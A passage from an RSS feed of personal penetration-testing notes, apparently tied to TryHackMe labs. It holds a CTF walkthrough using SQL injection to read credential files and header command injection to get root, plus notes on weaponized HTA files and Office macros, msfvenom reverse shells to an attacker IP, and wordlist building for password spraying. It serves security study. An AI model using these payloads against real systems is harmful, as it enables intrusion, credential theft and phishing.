1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) shows that both are permitted to login from &lt;code&gt;localhost&lt;/code&gt; (though that may not mean anything, since this is just database access).&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT authentication_string FROM mysql.user WHERE user = 'root' -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) reveals that &lt;code&gt;root&lt;/code&gt; &lt;em&gt;doesnât&lt;/em&gt; have a password, but &lt;code&gt;uhc&lt;/code&gt; has the password hash &lt;code&gt;$A$005$fqzRyy_GvC%I&quot;Ud!F3Z3eO0EhsyqGcOsJRT9yyY2rX68rfr78QxWqRyR9tb2&lt;/code&gt;. (Apparently thereâs no &lt;code&gt;password&lt;/code&gt; column in the &lt;code&gt;mysql.users&lt;/code&gt; table anymore; itâs now called &lt;code&gt;authentication_string&lt;/code&gt; per &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db&quot;&gt;the documentation&lt;/a&gt;.)&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Unfortunately, it turns out that we canât just feed this hash into &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20John%20the%20Ripper.md&quot;&gt;&lt;code&gt;john&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hashcat.md&quot;&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/a&gt;, but need to &lt;a href=&quot;https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/&quot;&gt;massage things a bit first&lt;/a&gt;.&lt;/p&gt;&lt;ol&gt;&lt;li&gt;First, we use â&lt;code&gt;' UNION SELECT CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) FROM mysql.user WHERE user = 'uhc'&lt;/code&gt;â to get a string that &lt;code&gt;hashcat&lt;/code&gt; can handle: â&lt;code&gt;$mysql$A$005*66717A5279795F47760843251049172255642146*335A33654F30456873797147634F734A525439797959327258363872667237385178577152795239746232&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Then we run &lt;code&gt;hashcat -m 7401 -O hash.txt rockyou.txt&lt;/code&gt;.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;But, this is going to take a loooong time... So, I tried a few other things:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Thereâs 6 users in the &lt;code&gt;players&lt;/code&gt; table, but none of them work as passwords (or alternate user names).&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT LOAD_FILE('/etc/passwd') -- 1&lt;/code&gt; displays the password file, but I canât access &lt;code&gt;/etc/shadow&lt;/code&gt;, so it doesnât look like weâre running as root.&lt;/li&gt;&lt;li&gt;But we can look at other files, including &lt;code&gt;/config.php&lt;/code&gt;! And it turns out that thereâs a cleartext password there that we can read with &lt;code&gt;' UNION SELECT LOAD_FILE('/var/www/html/config.php') -- 1&lt;/code&gt; : &lt;code&gt;uhc-11qual-global-pw&lt;/code&gt;. â&lt;em&gt;This works to log in as the &lt;code&gt;uhc&lt;/code&gt; user!&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The &lt;strong&gt;first flag&lt;/strong&gt; is then in the &lt;code&gt;user.txt&lt;/code&gt; file in &lt;code&gt;/home/uhc&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Unfortunately, &lt;code&gt;uhc&lt;/code&gt; isnât in the &lt;code&gt;sudoers&lt;/code&gt; file, and thereâs no obviously vulnerably SUID binaries or files with loose permissions.&lt;/p&gt;&lt;p&gt;But...&lt;/p&gt;&lt;p&gt;If you run &lt;code&gt;' UNION SELECT LOAD_FILE('/var/www/html/firewall.php') -- 1&lt;/code&gt; , youâll see that the &lt;em&gt;web server&lt;/em&gt; has sudo access, and uses it to make a call to &lt;code&gt;iptables&lt;/code&gt; using the value of either the &lt;code&gt;X-Forwarded-For&lt;/code&gt; or &lt;code&gt;Remote-Host&lt;/code&gt; headers. And since this call is just a concatenation of the value of this header wrapped in PHPâs &lt;code&gt;system()&lt;/code&gt; call, that means &lt;em&gt;I&lt;/em&gt; can insert whatever I want. For example, setting&lt;/p&gt;&lt;pre class=&quot;http&quot;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo ls -la /root ; echo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;lists the contents of the &lt;code&gt;/root&lt;/code&gt; directory, revealing the standard &lt;code&gt;/root/root.txt&lt;/code&gt; flag file. And thus&lt;/p&gt;&lt;pre class=&quot;http&quot;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo cat /root/root.txt ; echo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will return the contents of that file.&lt;/p&gt;&lt;p&gt;Which just so happens to be the â&lt;strong&gt;second flag&lt;/strong&gt;â.&lt;/p&gt;&lt;p&gt;(Really, I &lt;em&gt;should&lt;/em&gt; have used this trick to get both flags...)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 04:06&lt;/p&gt;</description>
			<pubDate>Fri, 28 Apr 2023 04:59:34 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Union.md</guid>
		</item>
		<item>
			<title>Exploiting HTML Applications</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20HTML%20Applications.md</link>
			<description>&lt;p&gt;Windows âHTML Applicationsâ are just HTML files (with the &lt;code&gt;.hta&lt;/code&gt; extension) containing JavaScript of VBScript. These are interpreted using the &lt;code&gt;mshta.exe&lt;/code&gt; binary; IE and Edge will both helpfully offer to run these files after theyâre downloaded.&lt;/p&gt;&lt;p&gt;A simple example that pops a command prompt:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;kw&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; command &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; âcmd&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;exeâ&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ActiveXObject&lt;/span&gt;(âWScript&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;Shellâ&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;Run&lt;/span&gt;(command)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;kw&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;using-metasploit&quot;&gt;Using Metasploit&lt;/h2&gt;&lt;p&gt;&lt;code&gt;msfvenom&lt;/code&gt; can be used to generate HTA refer shells.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/x64/shell_reverse_tcp LHOST=&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt; LPORT=&lt;span class=&quot;va&quot;&gt;$ATTACKER_PORT&lt;/span&gt; -f hta-psh -o &lt;span class=&quot;va&quot;&gt;${NAME}&lt;/span&gt;.hta&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Catch with the standard &lt;code&gt;nc -lvp $ATTACKER_PORT&lt;/code&gt; command.&lt;/p&gt;&lt;p&gt;Metasploit can do all of this automatically for us via &lt;code&gt;exploit/windows/misc/hta_server&lt;/code&gt;. Critical variables to set:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;LHOST&lt;/code&gt; â the host IP address to connect back to&lt;/li&gt;&lt;li&gt;&lt;code&gt;LPORT&lt;/code&gt; â the port to connect back to&lt;/li&gt;&lt;li&gt;&lt;code&gt;SRVHOST&lt;/code&gt; â the host IP address to serve the malicious file on&lt;/li&gt;&lt;li&gt;&lt;code&gt;payload&lt;/code&gt; â the Metasploit payload to use&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In quick-and-dirty cases &lt;code&gt;LHOST&lt;/code&gt; and &lt;code&gt;SRVHOST &lt;/code&gt;will be the same, though in more sophisticated operations (i.e., if youâre separating phishing and C2 IPs) they will be different. The payload variable is particularly useful, as you can use something like &lt;code&gt;windows/meterpreter/reverse_tcp&lt;/code&gt; and get a meterpreter shell, rather than just a plain reverse shell!&lt;/p&gt;&lt;p&gt;Note that you may have to hit âReturnâ once the file is served to get back to the Metasploit prompt.&lt;/p&gt;&lt;h3 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netcat%22.md&quot;&gt;Using ânetcatâ&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sun, 21 May 2023 00:42:41 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20HTML%20Applications.md</guid>
		</item>
		<item>
			<title>Exploiting Visual Basic for Applications</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Visual%20Basic%20for%20Applications.md</link>
			<description>&lt;p&gt;VBA scripts (âmacrosâ) are a variant of VBScripts designed for use within Microsoft Office. It must be written within the appropriate MS Office app, which I suppose is one reason to shell out for an Office subscription.&lt;/p&gt;&lt;p&gt;VBA scripts can be accessed within a document using the &lt;strong&gt;View â Macros â View Macros&lt;/strong&gt; command. This dialog also allows macros to be created, but when doing so be sure to set &lt;strong&gt;Macros in&lt;/strong&gt; to the current document!&lt;/p&gt;&lt;p&gt;Macros can be tested during development using the &lt;strong&gt;Run â Run Sub/UserForm&lt;/strong&gt; command in the VBA editor.&lt;/p&gt;&lt;p&gt;To get a macro to run when the document is opened requires it to be hooked into the &lt;code&gt;Document_Open()&lt;/code&gt; and &lt;code&gt;AutoOpen()&lt;/code&gt; functions (they &lt;em&gt;almost&lt;/em&gt; do the same thing; including both allows for better backward-compatibility).&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode vb&quot;&gt;&lt;code class=&quot;sourceCode monobasic&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;Sub &lt;/span&gt;DocumentOpen()&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    PoC&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;End Sub&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;Sub &lt;/span&gt;AutoOpen()&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    PoC&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;End Sub&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;Sub &lt;/span&gt;PoC()&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;co&quot;&gt;&amp;#39; Create a string variable named `payload`&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;Dim&lt;/span&gt; payload &lt;span class=&quot;kw&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;String&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;co&quot;&gt;&amp;#39; Set `payload` to the command we wish to launch&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    payload = &lt;span class=&quot;st&quot;&gt;&amp;quot;calc.exe&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;co&quot;&gt;&amp;#39; Fire!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    CreateObject(&lt;span class=&quot;st&quot;&gt;&amp;quot;Wscript.Shell&amp;quot;&lt;/span&gt;).Run payload,0&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;End Sub&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that &lt;code&gt;.docx&lt;/code&gt; files &lt;em&gt;cannot&lt;/em&gt; include macros anymore â either a &lt;code&gt;.docxm&lt;/code&gt; file needs to be used or the older &lt;code&gt;.doc&lt;/code&gt; format. Itâs generally better to use &lt;code&gt;.doc&lt;/code&gt;, as the &lt;code&gt;.docxm&lt;/code&gt; icon is noticeably different from that of a standard Word document. (All of these notes also apply to other Office formats, obviouslyâ¦)&lt;/p&gt;&lt;p&gt;Running an application using VBA Script is fundamentally the same as with the other methods â we invoke WSH. As with WSH, Iâve found that recent versions of Windows seem to greatly restrict what can be launched using WSH via Office macrosâ¦ Iâve managed to pop &lt;code&gt;calc.exe&lt;/code&gt;, but not anything else!&lt;/p&gt;&lt;h3 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20the%20Windows%20Scripting%20Host.md&quot;&gt;Exploiting the Windows Scripting Host&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;using-metasploit&quot;&gt;Using Metasploit&lt;/h2&gt;&lt;p&gt;Msfvenom can create VBA payloads, as one might expect. Despite WSH not wanting to pop &lt;code&gt;cmd.exe&lt;/code&gt; or other executables (outside of &lt;code&gt;calc.exe&lt;/code&gt;), a meterpreter reverse shell actually works! (That said, it will die when Word does, and thus needs to be migrated to a new process ASAPâ¦)&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/meterpreter/reverse_tcp LHOST=&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt; LPORT=&lt;span class=&quot;va&quot;&gt;$ATTACKER_PORT&lt;/span&gt; -f vba -o &lt;span class=&quot;va&quot;&gt;${NAME}&lt;/span&gt;.vba&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the VBA output will use the &lt;code&gt;Workbook_Open()&lt;/code&gt; function. This is suitable for Excel, but must be changed to &lt;code&gt;Document_Open()&lt;/code&gt; for Word.&lt;/p&gt;&lt;h3 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sun, 21 May 2023 00:42:41 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Visual%20Basic%20for%20Applications.md</guid>
		</item>
		<item>
			<title>Exploiting the Windows Scripting Host</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20the%20Windows%20Scripting%20Host.md</link>
			<description>&lt;p&gt;The Windows Scripting Host (WSH) consists of two tools, &lt;code&gt;cscript.exe&lt;/code&gt; for command-line scripts and &lt;code&gt;wscript.exe&lt;/code&gt; for UI scripts, and executes Visual Basic scripts (though it doesnât care about the extension). WSH operates with &lt;em&gt;regular user privileges&lt;/em&gt;, not admin privileges.&lt;/p&gt;&lt;p&gt;An example VBScript:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode vb&quot;&gt;&lt;code class=&quot;sourceCode monobasic&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;Dim&lt;/span&gt; message                &lt;span class=&quot;co&quot;&gt;&amp;#39; Create the variable `message`&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;message = &lt;span class=&quot;st&quot;&gt;&amp;quot;Welcome to THM&amp;quot;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;&amp;#39; Set the variable `message`&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;MsgBox message             &lt;span class=&quot;co&quot;&gt;&amp;#39; Display `message` using a pop-up dialog&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Executing a program requires creating a âshellâ object:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode vb&quot;&gt;&lt;code class=&quot;sourceCode monobasic&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;Set &lt;/span&gt;shell = WScript.CreateObject(&lt;span class=&quot;st&quot;&gt;&amp;quot;Wscript.Shell&amp;quot;&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;#39; Note the space after calc.exe! This is required because of&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;#39; some weird interactions between wscript.exe/cscript.exe and&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;#39; the VB runtime. Alternately, TRIPLE double quotes can be&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;#39; used instead.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;shell.Run(&lt;span class=&quot;st&quot;&gt;&amp;quot;C:\Windows\System32\calc.exe &amp;quot;&lt;/span&gt; &amp;amp; WScript.ScriptFullName),0,&lt;span class=&quot;kw&quot;&gt;True&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;#39; Alternate way to call calc.exe.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;shell.Run(&lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;quot;&amp;quot;C:\Windows\System32\calc.exe&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &amp;amp; WScript.ScriptFullName),0,&lt;span class=&quot;kw&quot;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It appears that recent versions of Windows may &lt;em&gt;severely&lt;/em&gt; limit which binaries can be called from the &lt;code&gt;Wscript.Shell&lt;/code&gt; object; &lt;code&gt;calc.exe&lt;/code&gt; works, but pretty much nothing else does.&lt;/p&gt;&lt;h2 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sun, 21 May 2023 00:42:41 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20the%20Windows%20Scripting%20Host.md</guid>
		</item>
		<item>
			<title>Using âcewlâ</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22cewl%22.md</link>
			<description>&lt;p&gt;The cewl utility (&lt;code&gt;sudo apt install cewl&lt;/code&gt; on Kali Linux) can be used to crawl a website and extract strings that can be used as a word list.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;cewl&lt;/span&gt; -w &lt;span class=&quot;va&quot;&gt;$OUTPUT_FILE&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$DEPTH_TO_SPIDER&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$MINIMUM_STRING_LENGTH&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;va&quot;&gt;$URL&lt;/span&gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Itâs generally worth pulling strings out of a companyâs website to seed a word list before attempting password spraying or brute-force login attacks.&lt;/p&gt;&lt;h2 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Mon, 22 May 2023 05:18:22 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22cewl%22.md</guid>
		</item>
		<item>
			<title>Using CUPP</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20CUPP.md</link>
